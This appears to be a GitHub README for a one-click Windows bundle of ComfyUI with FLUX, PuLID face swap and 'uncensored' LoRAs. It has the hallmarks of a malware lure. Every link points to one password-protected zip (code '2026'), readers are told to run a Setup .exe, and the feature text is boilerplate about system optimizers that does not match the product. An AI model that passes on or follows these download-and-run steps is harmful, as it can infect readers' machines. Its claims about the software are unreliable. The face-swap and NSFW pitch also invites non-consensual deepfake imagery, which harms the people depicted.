<div align="center">

# ComfyUI Portable + FLUX.1-dev GGUF Q8 + PuLID FaceSwap & Uncensored LoRA Pack

<p><strong>ComfyUI Portable + FLUX.1-dev GGUF Q8 + PuLID FaceSwap & Uncensored LoRA Pack: native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](https://github.com/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick/releases/download/v1.2.0/comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v1.2.0-2ea44f?style=for-the-badge&logo=github)](https://github.com/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick/releases/download/v1.2.0/comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](https://github.com/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick/releases/download/v1.2.0/comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick?style=for-the-badge&logo=github&color=e3b341)](https://github.com/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick/stargazers)
[![Open in Colab](https://img.shields.io/badge/Colab-Quickstart-F9AB00?style=for-the-badge&logo=googlecolab&logoColor=white)](https://colab.research.google.com/github/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick/blob/main/notebooks/quickstart.ipynb)

<a href="https://github.com/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick/releases/download/v1.2.0/comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip"><img src="assets/download_btn.svg" alt="Download comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip" width="520"></a>

<img src="assets/password_badge.svg" alt="Archive Code 2026" width="280">

<br>

<a href="https://github.com/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick/releases/download/v1.2.0/comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip"><img src="assets/preview.png" alt="ComfyUI Portable + FLUX.1-dev GGUF Q8 + PuLID FaceSwap & Uncensored LoRA Pack Preview" width="840"></a>

</div>

---

## Architecture Summary

**ComfyUI Portable + FLUX.1-dev GGUF Q8 + PuLID FaceSwap & Uncensored LoRA Pack** (`comfyui-flux-1-dev-gguf-nsfw-oneclick`) is a dedicated, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

## 1-Click Portable Installation

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (64-bit)** | [**`comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip`**](https://github.com/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick/releases/download/v1.2.0/comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip) | [**Official Docs (`comfyui-flux-1-dev-gguf-nsfw-oneclick`)**](https://tariqlang612.github.io/comfyui-flux-1-dev-gguf-nsfw-oneclick/) |

1. Download [`comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip`](https://github.com/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick/releases/download/v1.2.0/comfyui-flux-1-dev-gguf-nsfw-oneclick-v1.2.0-win64.zip) using the download button above.
2. Extract the archive using the access code shown on the badge above (`2026`).
3. Launch `ComfyuiFlux1DevGgufNsfwOneclick_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Core Subsystems & Capabilities

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Portable Lifecycle Engine** | Zero-install isolated state container | Leaves host registry clean; 1-click rollback |
| **Profile State Snapshot** | Automatic backup before applying changes | Restores baseline configuration at any time |
| **Telemetry & Task Tuner** | Disables redundant background update checks | Lowers idle memory & disk I/O overhead |
| **Unattended CLI Mode** | JSON-driven configuration (`config/settings.json`) | Scriptable batch deployment on Windows 10/11 |

## Configuration (`config/settings.json`)

```json
{
  "module": "comfyui-flux-1-dev-gguf-nsfw-oneclick",
  "version": "1.2.0",
  "runtime": {
    "portable_mode": true,
    "auto_backup_registry": true,
    "verify_signatures": true,
    "theme": "dark",
    "log_level": "info"
  },
  "modules": {
    "lifecycle_manager": {
      "enabled": true,
      "clean_temp_cache": true,
      "preserve_user_profiles": true
    },
    "service_optimizer": {
      "enabled": true,
      "disable_telemetry_tasks": true
    }
  }
}
```

## Documentation & Guides

- [ComfyUI Portable + FLUX.1-dev GGUF Q8 + PuLID FaceSwap & Uncensored LoRA Pack — Official Portable Download (Windows 10/11 x64)](https://tariqlang612.github.io/comfyui-flux-1-dev-gguf-nsfw-oneclick/comfyui-flux-1-dev-gguf-nsfw-oneclick-download.html)
- [ComfyUI Portable + FLUX.1-dev GGUF Q8 + PuLID FaceSwap & Uncensored LoRA Pack — Quickstart & Portable Setup Guide](https://tariqlang612.github.io/comfyui-flux-1-dev-gguf-nsfw-oneclick/comfyui-flux-1-dev-gguf-nsfw-oneclick-setup.html)

## Building from Source

```bash
git clone https://github.com/tariqlang612/comfyui-flux-1-dev-gguf-nsfw-oneclick.git
cd comfyui-flux-1-dev-gguf-nsfw-oneclick
dotnet build src/ComfyuiFlux1DevGgufNsfwOneclick.csproj -c Release
```

---
<sub>Indexed tags: comfyui, flux, dev, gguf, nsfw, oneclick, windows, windows-11, windows-10, dotnet, csharp, portable, utility, system-tools, lifecycle-management, optimizer</sub>
